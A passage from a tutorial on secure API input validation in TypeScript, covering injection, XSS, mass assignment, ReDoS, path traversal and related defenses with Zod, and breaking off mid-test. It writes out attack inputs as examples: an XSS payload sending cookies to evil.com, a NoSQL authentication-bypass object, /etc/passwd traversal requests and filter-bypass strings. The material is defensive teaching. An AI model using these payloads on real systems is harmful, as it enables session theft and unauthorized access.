    : '';

  // sortBy has been validated against an enum and only contains whitelisted values
  // -> safe to embed directly in the SQL string
  const allowedSortColumns = ['name', 'email', 'created_at'];
  const sortColumn = allowedSortColumns.includes(params.sortBy || '')
    ? params.sortBy
    : 'created_at';
  const sortOrder = params.order === 'asc' ? 'ASC' : 'DESC';

  const offset = ((params.page || 1) - 1) * (params.perPage || 20);

  const query = `
    SELECT id, name, email, role, age, created_at
    FROM users
    ${whereClause}
    ORDER BY ${sortColumn} ${sortOrder}
    LIMIT $${paramIndex++} OFFSET $${paramIndex++}
  `;

  values.push(params.perPage || 20, offset);

  return pool.query(query, values);
}
```

### 7.4 NoSQL Injection

Injection attacks can also occur in NoSQL databases such as MongoDB.

```typescript
// Example of MongoDB NoSQL injection

// BAD: Use user input directly in the query
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  // If email is an object like { "$gt": "" },
  // it will match all records
  const user = await db.collection('users').findOne({
    email,
    password,
  });
});

// Attack payload:
// { "email": { "$gt": "" }, "password": { "$gt": "" } }
// -> Matches all records (authentication bypass)

// GOOD: Defend with type checking
app.post('/api/login', async (req, res) => {
  const schema = z.object({
    email: z.string().email(),   // Enforce string type
    password: z.string().min(1), // Enforce string type
  });

  const result = schema.safeParse(req.body);
  if (!result.success) {
    return res.status(422).json({ errors: result.error.issues });
  }

  // string type is guaranteed because of validation
  const user = await db.collection('users').findOne({
    email: result.data.email,
    // Password should be compared with bcrypt.compare, not plain text
  });
});
```

---

## 8. Defense Against Common Attacks

### 8.1 XSS (Cross-Site Scripting)

```typescript
// XSS attack types and defenses

// 1. Reflected XSS: URL parameter value is embedded directly into HTML
//    Attack: GET /search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

// 2. Stored XSS: Saved data is rendered directly into HTML
//    Attack: Register <script>alert('XSS')</script> as a profile name

// 3. DOM-based XSS: Client-side JS performs unsafe data manipulation
//    Attack: Assign unescaped user input to innerHTML

// --- Defenses ---

// 1. Set API response headers
app.use((req, res, next) => {
  // Explicitly set Content-Type (prevent browser MIME sniffing)
  res.setHeader('X-Content-Type-Options', 'nosniff');

  // CSP (Content Security Policy)
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
  );

  // X-XSS-Protection (for legacy browsers)
  res.setHeader('X-XSS-Protection', '1; mode=block');

  next();
});

// 2. JSON APIs return Content-Type: application/json
//    Browsers don't interpret JSON as HTML, reducing XSS risk
app.get('/api/users', (req, res) => {
  res.json({ data: users }); // Content-Type: application/json is automatically set
});

// 3. Input validation and sanitization
const UserProfileSchema = z.object({
  displayName: z.string()
    .min(1)
    .max(50)
    .regex(/^[a-zA-Z0-9\u3040-\u309F\u30A0-\u30FF\u4E00-\u9FFF\s_-]+$/,
      'Display name contains invalid characters'
    ),
  bio: z.string()
    .max(500)
    .transform(escapeHtml),
});
```

### 8.2 Mass Assignment Attack

```typescript
// Mass Assignment attack example and defense

// Attack scenario:
// PUT /api/users/me
// { "name": "Taro", "email": "taro@example.com", "role": "admin", "isVerified": true }
// -> role and isVerified are fields that users should not be able to modify

// --- Defense 1: Zod strict() + pick() ---

// Base schema with all fields
const UserBaseSchema = z.object({
  name: z.string().min(1).max(100),
  email: z.string().email(),
  role: z.enum(['user', 'admin', 'editor']),
  isVerified: z.boolean(),
  bio: z.string().max(500).optional(),
  avatar: z.string().url().optional(),
});

// Extract only fields that the user can update themselves
const UserSelfUpdateSchema = UserBaseSchema
  .pick({
    name: true,
    bio: true,
    avatar: true,
  })
  .strict(); // Error if there are undefined fields

// Fields that administrators can update
const UserAdminUpdateSchema = UserBaseSchema
  .partial()  // Make all fields optional
  .strict();

// --- Defense 2: class-validator whitelist ---
// NestJS ValidationPipe automatically removes undefined fields
// new ValidationPipe({ whitelist: true, forbidNonWhitelisted: true })

// --- Defense 3: Explicit field selection ---
function pickAllowedFields<T extends Record<string, any>>(
  data: T,
  allowedFields: (keyof T)[]
): Partial<T> {
  const result: Partial<T> = {};
  for (const field of allowedFields) {
    if (field in data) {
      result[field] = data[field];
    }
  }
  return result;
}

// Usage example
app.put('/api/users/me', async (req, res) => {
  const safeData = pickAllowedFields(req.body, ['name', 'bio', 'avatar']);
  await userService.update(req.user.id, safeData);
});
```

### 8.3 ReDoS (Regular Expression DoS)

```typescript
// ReDoS attack: regex backtracking explodes with malicious input

// BAD: Vulnerable regular expression
const emailRegexBad = /^([a-zA-Z0-9]+\.)*[a-zA-Z0-9]+@([a-zA-Z0-9]+\.)+[a-zA-Z]{2,}$/;
// Input like "aaaaaaaaaaaaaaaaaaaaaaaaa!" causes exponential backtracking

// GOOD: Writing safe regular expressions
// 1. Limit input length first
const safeEmailCheck = (input: string): boolean => {
  if (input.length > 254) return false; // RFC 5321
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input);
};

// 2. Use built-in validators (Zod, Joi's email())
//    These use ReDoS-resistant implementations

// 3. Limit regex complexity
//    - Avoid nested quantifiers: (a+)+ -> a+
//    - Avoid overlapping character classes: [a-zA-Z0-9]*[a-z]* -> [a-zA-Z0-9]*
//    - Use fixed-length anchors: ^...$

// 4. Set a timeout (for Node.js)
function safeRegexTest(
  pattern: RegExp,
  input: string,
  timeoutMs: number = 100
): boolean {
  // Apply input length limit first
  if (input.length > 10000) return false;

  const start = performance.now();
  try {
    return pattern.test(input);
  } finally {
    const elapsed = performance.now() - start;
    if (elapsed > timeoutMs) {
      console.warn(`Regex took ${elapsed}ms for input length ${input.length}`);
    }
  }
}
```

### 8.4 Path Traversal

```typescript
// Path traversal attack: manipulate file paths to bypass access controls

// Attack examples:
// GET /api/files/../../etc/passwd
// GET /api/files/..%2F..%2Fetc%2Fpasswd  (URL encoded)

import path from 'path';

// BAD: No path validation
app.get('/api/files/:filename', (req, res) => {
  const filePath = path.join('/uploads', req.params.filename);
  res.sendFile(filePath); // ../../etc/passwd is accessible
});

// GOOD: Safe file access
const UPLOAD_DIR = '/app/uploads';

const FilenameSchema = z.string()
  .min(1)
  .max(255)
  .regex(/^[a-zA-Z0-9][a-zA-Z0-9._-]*$/, 'Invalid filename')
  .refine(
    (name) => !name.includes('..'),
    'Path traversal detected'
  )
  .refine(
    (name) => !name.includes('\0'),
    'Null byte detected'
  );

app.get('/api/files/:filename', (req, res) => {
  const result = FilenameSchema.safeParse(req.params.filename);
  if (!result.success) {
    return res.status(400).json({ error: 'Invalid filename' });
  }

  const filePath = path.resolve(UPLOAD_DIR, result.data);

  // Verify the path stays within the base directory
  if (!filePath.startsWith(UPLOAD_DIR)) {
    return res.status(403).json({ error: 'Access denied' });
  }

  res.sendFile(filePath);
});
```

### 8.5 JSON Payload Attacks

```typescript
// JSON payload attack: cause DoS with massive or deeply nested JSON

// Attack examples:
// 1. Huge payload: hundreds of MB of JSON
// 2. Deep nesting: { "a": { "b": { "c": { ... 10000 levels ... } } } }
// 3. Large number of keys: { "key1": 1, "key2": 2, ..., "key1000000": 1000000 }

// --- Defenses ---

// 1. Limit body size
import express from 'express';
app.use(express.json({
  limit: '1mb',  // Reject requests exceeding 1MB
}));

// 2. Limit nesting depth (custom middleware)
function checkNestingDepth(obj: any, maxDepth: number, currentDepth: number = 0): boolean {
  if (currentDepth > maxDepth) return false;
  if (typeof obj !== 'object' || obj === null) return true;

  for (const value of Object.values(obj)) {
    if (!checkNestingDepth(value, maxDepth, currentDepth + 1)) {
      return false;
    }
  }
  return true;
}

app.use((req, res, next) => {
  if (req.body && !checkNestingDepth(req.body, 10)) {
    return res.status(400).json({
      error: 'Request body nesting depth exceeds maximum allowed (10)',
    });
  }
  next();
});

// 3. Limit object key count
function checkKeyCount(obj: any, maxKeys: number): boolean {
  if (typeof obj !== 'object' || obj === null) return true;
  if (Object.keys(obj).length > maxKeys) return false;

  for (const value of Object.values(obj)) {
    if (!checkKeyCount(value, maxKeys)) return false;
  }
  return true;
}

// 4. Limit array size (declaratively with Zod)
const OrderSchema = z.object({
  items: z.array(
    z.object({
      productId: z.string().uuid(),
      quantity: z.number().int().min(1).max(999),
    })
  ).min(1).max(100), // Maximum 100 items
  memo: z.string().max(500).optional(),
});
```

---

## 9. Validation Error Response Design

### 9.1 RFC 7807-Compliant Error Responses

API error responses should be returned in a consistent format. RFC 7807 (Problem Details for HTTP APIs) defines the standard format for HTTP API error responses.

```typescript
// RFC 7807-compliant error response type definition
interface ProblemDetails {
  type: string;      // URI for error type (documentation URL)
  title: string;     // Human-readable error summary
  status: number;    // HTTP status code
  detail?: string;   // Detailed description of this specific error
  instance?: string; // The specific URI at which this error occurred
}

interface ValidationProblemDetails extends ProblemDetails {
  errors: Array<{
    field: string;      // Name of the field where the error occurred
    code: string;       // Machine-readable error code
    message: string;    // Human-readable error message
    rejected?: unknown; // Rejected value (for debugging; may be omitted in production)
  }>;
}

// Example validation error response
// HTTP/1.1 422 Unprocessable Entity
// Content-Type: application/problem+json
//
// {
//   "type": "https://api.example.com/errors/validation",
//   "title": "Validation Error",
//   "status": 422,
//   "detail": "The request body contains 3 validation error(s).",
//   "instance": "/api/v1/users",
//   "errors": [
//     {
//       "field": "email",
//       "code": "invalid_string",
//       "message": "Invalid email format"
//     },
//     {
//       "field": "age",
//       "code": "too_small",
//       "message": "Age must be non-negative"
//     },
//     {
//       "field": "address.postalCode",
//       "code": "invalid_string",
//       "message": "Invalid postal code"
//     }
//   ],
//   "requestId": "req_abc123"
// }

// Unified error handler
function createValidationErrorResponse(
  errors: Array<{ field: string; code: string; message: string }>,
  requestPath: string,
  requestId: string
): ValidationProblemDetails & { requestId: string } {
  return {
    type: 'https://api.example.com/errors/validation',
    title: 'Validation Error',
    status: 422,
    detail: `The request contains ${errors.length} validation error(s).`,
    instance: requestPath,
    errors,
    requestId,
  };
}
```

### 9.2 Status Code Usage Guide

| Status Code | Purpose | Usage Scenario |
|-------------|---------|----------------|
| 400 Bad Request | Request syntax error | JSON parse error, invalid Content-Type |
| 401 Unauthorized | Authentication error | Token not sent, token expired |
| 403 Forbidden | Authorization error | Insufficient permissions |
| 404 Not Found | Resource not found | Resource with specified ID does not exist |
| 409 Conflict | Conflict | Duplicate email address |
| 413 Payload Too Large | Payload too large | Body size exceeded |
| 422 Unprocessable Entity | Validation error | Invalid field value |
| 429 Too Many Requests | Rate limiting | API call count exceeded |

### 9.3 Internationalization (i18n) of Error Messages

```typescript
// Internationalization of validation error messages

// Separate error codes and messages
const ERROR_MESSAGES: Record<string, Record<string, string>> = {
  ja: {
    'validation.required': '{field}は必須です',
    'validation.email': '有効なメールアドレスを入力してください',
    'validation.min_length': '{field}は{min}文字以上で入力してください',
    'validation.max_length': '{field}は{max}文字以内で入力してください',
    'validation.min': '{field}は{min}以上の値を入力してください',
    'validation.max': '{field}は{max}以下の値を入力してください',
    'validation.pattern': '{field}の形式が正しくありません',
    'validation.enum': '{field}は{values}のいずれかを指定してください',
  },
  en: {
    'validation.required': '{field} is required',
    'validation.email': 'Please enter a valid email address',
    'validation.min_length': '{field} must be at least {min} characters',
    'validation.max_length': '{field} must be at most {max} characters',
    'validation.min': '{field} must be at least {min}',
    'validation.max': '{field} must be at most {max}',
    'validation.pattern': '{field} format is invalid',
    'validation.enum': '{field} must be one of {values}',
  },
};

function getErrorMessage(
  locale: string,
  code: string,
  params: Record<string, string | number> = {}
): string {
  const messages = ERROR_MESSAGES[locale] || ERROR_MESSAGES['en'];
  let message = messages[code] || code;

  for (const [key, value] of Object.entries(params)) {
    message = message.replace(`{${key}}`, String(value));
  }

  return message;
}

// Determine locale based on Accept-Language header
function getLocaleFromRequest(req: Request): string {
  const acceptLanguage = req.headers['accept-language'] || 'en';
  const preferred = acceptLanguage.split(',')[0].split('-')[0].toLowerCase();
  return ['ja', 'en'].includes(preferred) ? preferred : 'en';
}
```

---

## 10. Anti-Pattern Catalog

### 10.1 Anti-Pattern 1: Relying Solely on Client-Side Validation

```
+================================================================+
|  Anti-Pattern: Validation Only on the Client Side              |
+================================================================+
|                                                                |
|  [Incorrect Design]                                            |
|                                                                |
|  Browser                            Server                     |
|  +--------------------+           +--------------------+       |
|  | Form Validation    |   ──>    | No Validation      |       |
|  | (JavaScript)       |           | Save to DB directly|       |
|  +--------------------+           +--------------------+       |
|                                                                |
|  Problems:                                                     |
|  · Can be bypassed by sending requests directly via curl/Postman|
|  · JavaScript can be disabled in the browser developer tools   |
|  · The API is not always accessed through a browser            |
|  · Access also comes from mobile apps, external systems, bots  |
|                                                                |
|  ─────────────────────────────────────────────────             |
|                                                                |
|  [Correct Design]                                              |
|                                                                |
|  Browser                            Server                     |
|  +--------------------+           +--------------------+       |
|  | Form Validation    | ──>      | Server-Side        |       |
|  | (for UX only)      |           | Validation         |       |
|  +--------------------+           | (for security)     |       |
|                                   +--------------------+       |
|                                                                |
|  Client-side: Feedback for UX (not mandatory)                  |
|  Server-side: Verification for security (mandatory)            |
|                                                                |
+================================================================+
```

Why it is dangerous:
- Attackers can completely bypass client-side validation using HTTP clients (curl, Burp Suite, etc.)
- Validation is not executed when accessed from a browser with JavaScript disabled
- Client-side code can be tampered with and is not trustworthy

The correct approach:
- Treat server-side validation as "mandatory"
- Treat client-side validation as "added value" for UX improvement
- If applying the same validation rules on both sides, share the Zod schema (e.g., as a shared module in a monorepo)

### 10.2 Anti-Pattern 2: Blacklist-Based Validation

```typescript
// BAD: Blacklist (enumerating prohibited patterns)
function sanitizeInputBad(input: string): string {
  // Approach of removing known attack patterns
  let sanitized = input;
  sanitized = sanitized.replace(/<script>/gi, '');
  sanitized = sanitized.replace(/<\/script>/gi, '');
  sanitized = sanitized.replace(/javascript:/gi, '');
  sanitized = sanitized.replace(/on\w+=/gi, '');     // onclick=, onerror=, etc.
  sanitized = sanitized.replace(/eval\(/gi, '');
  sanitized = sanitized.replace(/document\./gi, '');
  return sanitized;
}
// Problems:
// 1. Can be bypassed: <scr<script>ipt> -> <script> (attack string reconstructed after removal)
// 2. Encoding bypass: &#60;script&#62; (HTML entities)
// 3. Mixed case: <ScRiPt>
// 4. Unicode bypass: ＜script＞ (full-width characters)
// 5. Slow to respond to new attack vectors

// GOOD: Whitelist (explicitly defining allowed patterns)
const SafeUsernameSchema = z.string()
  .min(3)
  .max(30)
  .regex(/^[a-zA-Z0-9_-]+$/, 'Username must contain only letters, numbers, _ and -');
// By explicitly defining allowed characters,
// no attack pattern can be entered

// GOOD: Context-appropriate output escaping
function renderUserName(name: string, context: 'html' | 'url' | 'json'): string {
  switch (context) {
    case 'html':
      return escapeHtml(name);
    case 'url':
      return encodeURIComponent(name);
    case 'json':
      return JSON.stringify(name);
    default:
      return name;
  }
}
```

### 10.3 Anti-Pattern 3: Information Leakage in Error Messages

```typescript
// BAD: Error messages that expose internal implementation details
app.post('/api/login', async (req, res) => {
  try {
    const user = await db.query(
      'SELECT * FROM users WHERE email = $1',
      [req.body.email]
    );

    if (!user) {
      // BAD: Reveals whether the email address is registered
      return res.status(404).json({
        error: 'User with this email does not exist',
      });
    }

    const valid = await bcrypt.compare(req.body.password, user.password);
    if (!valid) {
      // BAD: Reveals that the password is wrong
      return res.status(401).json({
        error: 'Incorrect password',
      });
    }
  } catch (err) {
    // BAD: Exposes stack trace
    return res.status(500).json({
      error: err.message,
      stack: err.stack,
      query: 'SELECT * FROM users WHERE email = ...',
    });
  }
});

// GOOD: Safe error messages
app.post('/api/login', async (req, res) => {
  try {
    const user = await db.query(
      'SELECT * FROM users WHERE email = $1',
      [req.body.email]
    );

    const valid = user && await bcrypt.compare(req.body.password, user.password);

    if (!valid) {
      // Do not reveal whether it was the email or password that was wrong
      return res.status(401).json({
        type: 'https://api.example.com/errors/authentication',
        title: 'Authentication Failed',
        status: 401,
        detail: 'Invalid email or password.',
      });
    }
  } catch (err) {
    // Log internal error details, return a generic message to the client
    logger.error('Login error', { error: err, email: req.body.email });
    return res.status(500).json({
      type: 'https://api.example.com/errors/internal',
      title: 'Internal Server Error',
      status: 500,
      detail: 'An unexpected error occurred. Please try again later.',
    });
  }
});
```

---

## 11. Edge Case Analysis

### 11.1 Edge Case 1: Unicode Normalization and Visually Identical Characters

```typescript
// Unicode contains many characters that "look the same but have different code points"

// Example 1: Mixed full-width and half-width
const inputs = [
  'admin',          // Half-width Latin characters
  'ａｄｍｉｎ',      // Full-width Latin characters (U+FF41, etc.)
  'аdmin',          // Cyrillic 'а' (U+0430) + Latin 'dmin'
];

// These look almost identical but have different byte sequences
// -> Possibility of bypassing username uniqueness checks

// Countermeasure: Unicode normalization + ASCII conversion
function normalizeUsername(input: string): string {
  // 1. NFKC normalization (normalization by compatibility equivalence)
  //    Converts full-width alphanumeric to half-width
  let normalized = input.normalize('NFKC');

  // 2. Limit the range of allowed characters
  //    Allow only ASCII alphanumeric and some symbols
  if (!/^[a-zA-Z0-9_-]+$/.test(normalized)) {
    throw new Error('Username contains invalid characters');
  }

  return normalized.toLowerCase();
}

// Example 2: Combining characters and precomposed characters
// 'e' + '◌́' (combining acute accent) = 'é' (NFD: 2 code points)
// 'é' (U+00E9) (NFC: 1 code point)
// These look completely identical but may not match in string comparison

// Countermeasure: Apply NFC normalization consistently before saving
const NameSchema = z.string()
  .min(1)
  .max(100)
  .transform(val => val.normalize('NFC').trim());

// Example 3: Invisible and zero-width characters
// U+200B Zero Width Space
// U+200C Zero Width Non-Joiner
// U+200D Zero Width Joiner
// U+FEFF Byte Order Mark

function removeInvisibleChars(str: string): string {
  return str.replace(/[\u200B\u200C\u200D\uFEFF\u00AD\u2060\u180E]/g, '');
}

// Comprehensive username validation with Zod
const UsernameSchema = z.string()
  .transform(val => val.normalize('NFKC'))
  .transform(removeInvisibleChars)
  .transform(val => val.trim().toLowerCase())
  .pipe(
    z.string()
      .min(3, 'Username must be at least 3 characters')
      .max(30, 'Username must be at most 30 characters')
      .regex(/^[a-z0-9_-]+$/, 'Username must contain only lowercase letters, numbers, _ and -')
  );
```

### 11.2 Edge Case 2: Numeric Precision and Overflow

```typescript
// Pitfalls in JavaScript/TypeScript numeric processing

// Problem 1: IEEE 754 floating-point precision limits
console.log(0.1 + 0.2);           // 0.30000000000000004
console.log(0.1 + 0.2 === 0.3);   // false

// Problem 2: Precision loss with large integers
console.log(9007199254740992 === 9007199254740993); // true (!)
// Number.MAX_SAFE_INTEGER = 9007199254740991

// Problem 3: Precision loss during JSON parsing
const json = '{"id": 9007199254740993}';
console.log(JSON.parse(json).id); // 9007199254740992 (off by 1)

// --- Countermeasures ---

// 1. Handle monetary amounts as integers (smallest currency unit)
const MoneySchema = z.object({
  // Amount stored in minor units (1 USD = 100 cents)
  amountInMinorUnit: z.number()
    .int('Amount must be an integer')
    .min(0, 'Amount must be non-negative')
    .max(999999999999, 'Amount exceeds maximum'),
  currency: z.enum(['JPY', 'USD', 'EUR']),
});

// 2. Handle large IDs as strings
const ResourceIdSchema = z.string()
  .regex(/^\d{1,20}$/, 'Invalid resource ID')
  .refine(
    (val) => {
      const num = BigInt(val);
      return num > 0n;
    },
    'Resource ID must be positive'
  );

// 3. Use Decimal type (Prisma)
// schema.prisma:
// model Product {
//   price Decimal @db.Decimal(10, 2)
// }

// 4. Receive large JSON numbers as strings
const TransactionSchema = z.object({
  // Twitter/Snowflake IDs and other large integers
  transactionId: z.string()
    .regex(/^\d{1,20}$/)
    .describe('Transaction ID as string to prevent precision loss'),

  amount: z.string()
    .regex(/^\d+(\.\d{1,2})?$/, 'Invalid amount format')
    .describe('Amount as string for decimal precision'),
});

// 5. Explicitly check integer range
const SafeIntSchema = z.number()
  .int()
  .min(Number.MIN_SAFE_INTEGER)
  .max(Number.MAX_SAFE_INTEGER);
```

### 11.3 Edge Case 3: Timezone and Datetime Validation

```typescript
// Pitfalls in datetime validation

// Problem 1: Missing timezone information
// "2024-03-15T10:00:00" -> 10 o'clock in which timezone?
// "2024-03-15T10:00:00Z" -> 10 o'clock UTC (clear)
// "2024-03-15T10:00:00+09:00" -> 10 o'clock JST (clear)

// Countermeasure: Require timezone in ISO 8601 format
const DateTimeSchema = z.string()
  .datetime({ message: 'Must be ISO 8601 format with timezone' });
// "2024-03-15T10:00:00Z" -> OK
// "2024-03-15T10:00:00+09:00" -> OK
// "2024-03-15T10:00:00" -> NG

// Problem 2: Leap seconds, daylight saving time transitions
// 2024-03-10T02:30:00 America/New_York -> Does not exist (DST jump: 2:00->3:00)
// 2024-11-03T01:30:00 America/New_York -> Ambiguous (01:30 occurs twice)

// Countermeasure: Store in UTC, convert timezone for display
const EventSchema = z.object({
  title: z.string().min(1).max(200),
  // Always receive and store in UTC
  startAt: z.string().datetime(),
  endAt: z.string().datetime(),
  // Timezone information for display is a separate field
  timezone: z.string()
    .regex(/^[A-Za-z]+\/[A-Za-z_]+$/, 'Invalid timezone format')
    .default('UTC'),
}).refine(
  (data) => new Date(data.startAt) < new Date(data.endAt),
  { message: 'endAt must be after startAt', path: ['endAt'] }
);
```

---

## 12. Exercises

### 12.1 Exercise 1 (Basic): Product Registration Schema for an E-commerce Site

Create a Zod schema `CreateProductSchema` that satisfies the following requirements.

Requirements:
- `name`: Required, 1–200 characters, remove leading/trailing whitespace
- `description`: Optional, maximum 5000 characters, disable HTML tags
- `price`: Required, non-negative integer, maximum 999,999,999
- `currency`: Required, one of 'JPY', 'USD', 'EUR'
- `category`: Required, one of 'electronics', 'clothing', 'food', 'books', 'other'
- `tags`: Optional, array of strings, each tag maximum 30 characters, maximum 20 tags
- `images`: Required, array of 1–10 objects, each object has `url` (URL format) and `alt` (1–100 characters)
- `stock`: Required, non-negative integer
- `isPublished`: Optional, default false

```typescript
// Solution:
const CreateProductSchema = z.object({
  name: z.string()
    .min(1, 'Product name is required')
    .max(200, 'Product name must be 200 characters or less')
    .trim(),

  description: z.string()
    .max(5000, 'Description must be 5000 characters or less')
    .transform(escapeHtml)
    .optional(),

  price: z.number()
    .int('Price must be an integer')
    .min(0, 'Price must be non-negative')
    .max(999_999_999, 'Price exceeds maximum'),

  currency: z.enum(['JPY', 'USD', 'EUR']),

  category: z.enum(['electronics', 'clothing', 'food', 'books', 'other']),

  tags: z.array(
    z.string().max(30, 'Each tag must be 30 characters or less').trim()
  ).max(20, 'Maximum 20 tags').default([]),

  images: z.array(
    z.object({
      url: z.string().url('Invalid image URL'),
      alt: z.string().min(1).max(100),
    })
  ).min(1, 'At least one image is required')
   .max(10, 'Maximum 10 images'),

  stock: z.number()
    .int('Stock must be an integer')
    .min(0, 'Stock must be non-negative'),

  isPublished: z.boolean().default(false),
});

type CreateProductInput = z.infer<typeof CreateProductSchema>;
```

### 12.2 Exercise 2 (Intermediate): Building a Generic Validation Middleware

Build a generic validation middleware for Express. It must satisfy the following requirements.

Requirements:
- Able to validate body, query, params, and headers
- Return errors in RFC 7807 format
- Collect all errors and return them together
- Include requestId in error response
- Include log output

```typescript
// Solution:
import { z, ZodSchema } from 'zod';
import { Request, Response, NextFunction } from 'express';
import { randomUUID } from 'crypto';

interface ValidationSchemas {
  body?: ZodSchema;
  query?: ZodSchema;
  params?: ZodSchema;
  headers?: ZodSchema;
}

interface ValidationError {
  location: 'body' | 'query' | 'params' | 'headers';
  field: string;
  code: string;
  message: string;
}

function createValidator(schemas: ValidationSchemas) {
  return (req: Request, res: Response, next: NextFunction) => {
    const requestId = (req.headers['x-request-id'] as string) || randomUUID();
    const errors: ValidationError[] = [];

    const targets: Array<{
      key: keyof ValidationSchemas;
      source: any;
      assignTo?: string;
    }> = [
      { key: 'body', source: req.body },
      { key: 'query', source: req.query, assignTo: 'validatedQuery' },
      { key: 'params', source: req.params, assignTo: 'validatedParams' },
      { key: 'headers', source: req.headers, assignTo: 'validatedHeaders' },
    ];

    for (const target of targets) {
      const schema = schemas[target.key];
      if (!schema) continue;

      const result = schema.safeParse(target.source);
      if (!result.success) {
        result.error.issues.forEach(issue => {
          errors.push({
            location: target.key as ValidationError['location'],
            field: issue.path.join('.'),
            code: issue.code,
            message: issue.message,
          });
        });
      } else {
        if (target.key === 'body') {
          req.body = result.data;
        } else if (target.assignTo) {
          (req as any)[target.assignTo] = result.data;
        }
      }
    }

    if (errors.length > 0) {
      console.warn(`[Validation] ${req.method} ${req.path} - ${errors.length} error(s)`, {
        requestId,
        errors,
      });

      return res.status(422).json({
        type: 'https://api.example.com/errors/validation',
        title: 'Validation Error',
        status: 422,
        detail: `The request contains ${errors.length} validation error(s).`,
        instance: req.originalUrl,
        errors,
        requestId,
      });
    }

    next();
  };
}

// Usage example:
app.post('/api/v1/products',
  createValidator({
    body: CreateProductSchema,
    headers: z.object({
      'content-type': z.literal('application/json'),
    }).passthrough(),
  }),
  async (req, res) => {
    const product = await productService.create(req.body);
    res.status(201).json({ data: product });
  }
);
```

### 12.3 Exercise 3 (Advanced): Integration of Validation + Sanitization + Security

Build an endpoint for a blog post API that satisfies all of the following security requirements.

Requirements:
- Mass Assignment prevention (use `.strict()`)
- XSS prevention (HTML sanitization)
- SQL injection prevention (parameterized queries)
- ReDoS prevention (safe regex + input length limit)
- Path traversal prevention (filename validation)
- Payload size limit
- Appropriate error responses

```typescript
// Solution:

// 1. Schema definition (Mass Assignment prevention)
const CreateBlogPostSchema = z.object({
  title: z.string()
    .min(1, 'Title is required')
    .max(200, 'Title must be 200 characters or less')
    .trim()
    .transform(removeControlChars),

  // Allow HTML but only safe tags
  content: z.string()
    .min(1, 'Content is required')
    .max(100000, 'Content must be 100000 characters or less')
    .transform(sanitizeHtml),

  slug: z.string()
    .min(1)
    .max(200)
    .regex(/^[a-z0-9]+(?:-[a-z0-9]+)*$/, 'Invalid slug format')
    .transform(val => val.toLowerCase()),

  tags: z.array(
    z.string()
      .max(30)
      .regex(/^[a-zA-Z0-9\u3040-\u309F\u30A0-\u30FF\u4E00-\u9FFF_-]+$/)
  ).max(10).default([]),

  coverImage: z.object({
    filename: z.string()
      .max(255)
      .regex(/^[a-zA-Z0-9._-]+$/, 'Invalid filename')
      .refine(name => !name.includes('..'), 'Path traversal detected'),
    mimeType: z.enum(['image/jpeg', 'image/png', 'image/webp']),
    size: z.number().max(5 * 1024 * 1024, 'Image must be under 5MB'),
  }).optional(),

  status: z.enum(['draft', 'published']).default('draft'),
}).strict(); // Reject undefined fields

// 2. Route handler
app.post('/api/v1/posts',
  express.json({ limit: '2mb' }),   // Payload size limit
  authenticate,                      // Authentication
  createValidator({ body: CreateBlogPostSchema }),
  async (req, res) => {
    const { title, content, slug, tags, coverImage, status } = req.body;
    const authorId = req.user.id;

    // 3. Save with parameterized queries
    const result = await pool.query(
      `INSERT INTO posts (title, content, slug, tags, cover_image, status, author_id, created_at)
       VALUES ($1, $2, $3, $4, $5, $6, $7, NOW())
       RETURNING id, title, slug, status, created_at`,
      [title, content, slug, JSON.stringify(tags), JSON.stringify(coverImage), status, authorId]
    );

    res.status(201).json({
      data: result.rows[0],
    });
  }
);
```

---

## 13. Environment Variable Validation

Validating environment variables at startup prevents production incidents caused by misconfiguration.

```typescript
// ============================================================
// Code Example 7: Environment Variable Validation (Startup Check)
// ============================================================

const EnvSchema = z.object({
  // Server settings
  NODE_ENV: z.enum(['development', 'staging', 'production']),
  PORT: z.coerce.number().int().min(1).max(65535).default(3000),
  HOST: z.string().default('0.0.0.0'),

  // Database
  DATABASE_URL: z.string().url(),
  DATABASE_POOL_SIZE: z.coerce.number().int().min(1).max(100).default(10),

  // Redis
  REDIS_URL: z.string().url(),

  // Authentication
  JWT_SECRET: z.string().min(32, 'JWT_SECRET must be at least 32 characters'),
  JWT_EXPIRY: z.string().default('15m'),

  // External services
  SMTP_HOST: z.string().min(1),
  SMTP_PORT: z.coerce.number().int().default(587),
  SMTP_USER: z.string().min(1),
  SMTP_PASS: z.string().min(1),

  // Logging
  LOG_LEVEL: z.enum(['debug', 'info', 'warn', 'error']).default('info'),
});

type Env = z.infer<typeof EnvSchema>;

// Run validation at startup
function loadEnv(): Env {
  const result = EnvSchema.safeParse(process.env);

  if (!result.success) {
    console.error('Environment variable validation failed:');
    result.error.issues.forEach(issue => {
      console.error(`  ${issue.path.join('.')}: ${issue.message}`);
    });
    process.exit(1); // Do not start if environment variables are invalid
  }

  return result.data;
}

// Application startup
const env = loadEnv();
console.log(`Starting server on ${env.HOST}:${env.PORT} in ${env.NODE_ENV} mode`);
```

---

## 14. Testing Strategy

Validation logic works extremely well with unit testing. By testing normal cases, error cases, and boundary values, you can ensure comprehensive coverage of your validation.

```typescript
// ============================================================
// Code Example 8: Testing Validation Schemas
// ============================================================
import { describe, it, expect } from 'vitest';

describe('CreateUserSchema', () => {
  // --- Normal cases ---
  it('should accept valid input with all required fields', () => {
    const input = {
      name: 'Tanaka Taro',
      email: 'taro@example.com',
    };
    const result = CreateUserSchema.safeParse(input);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.name).toBe('Tanaka Taro');
      expect(result.data.email).toBe('taro@example.com');
      expect(result.data.role).toBe('user');  // Default value
      expect(result.data.tags).toEqual([]);   // Default value
    }
  });

  it('should trim whitespace from name', () => {
    const input = { name: '  Taro  ', email: 'taro@example.com' };
    const result = CreateUserSchema.safeParse(input);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.name).toBe('Taro');
    }
  });

  it('should lowercase email', () => {
    const input = { name: 'Taro', email: 'TARO@EXAMPLE.COM' };
    const result = CreateUserSchema.safeParse(input);
    expect(result.success).toBe(true);
    if (result.success) {
      expect(result.data.email).toBe('taro@example.com');
    }
  });

  // --- Error cases ---
  it('should reject empty name', () => {
    const input = { name: '', email: 'taro@example.com' };
    const result = CreateUserSchema.safeParse(input);
    expect(result.success).toBe(false);
    if (!result.success) {
      expect(result.error.issues[0].path).toEqual(['name']);
    }
  });

  it('should reject invalid email', () => {
    const input = { name: 'Taro', email: 'not-an-email' };
    const result = CreateUserSchema.safeParse(input);
